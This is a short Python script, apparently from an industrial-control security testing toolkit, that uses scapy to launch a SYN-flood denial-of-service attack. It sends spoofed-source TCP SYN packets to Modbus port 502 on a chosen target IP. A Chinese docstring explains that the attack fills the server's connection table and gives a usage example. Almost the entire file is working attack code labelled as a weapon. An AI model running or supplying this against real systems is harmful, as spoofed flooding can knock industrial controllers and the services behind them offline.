# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *

from scapy.layers.inet import IP, TCP

ret = dict()
ret['status'] = None


"""
传输层 TCP, SYN拒绝服务攻击，向目标端口发送大量设置了SYN标志位的TCP数据包，将服务器连接表填满，此时受攻击的服务器无法接收新来的连接请求。
python TCP拒绝服务攻击武器.py --ip 10.0.0.47 --count 700
ModBus默认502
openplc没什么效果
"""
def start_attack(pdst, count):
    for i in range(count):
        psrc = "%i.%i.%i.%i" % (
        random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        send(IP(src=psrc, dst=pdst) / TCP(dport=502, flags="S"), verbose=False)


    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --ip 1.1.1.1 --count 200 \n')
    parser.add_option('-i', '--ip', dest='attack_ip', default='1.1.1.1', type='string', help='attack ip')
    parser.add_option('-c', '--count', dest='attack_count', default='500', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(options.attack_ip, int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
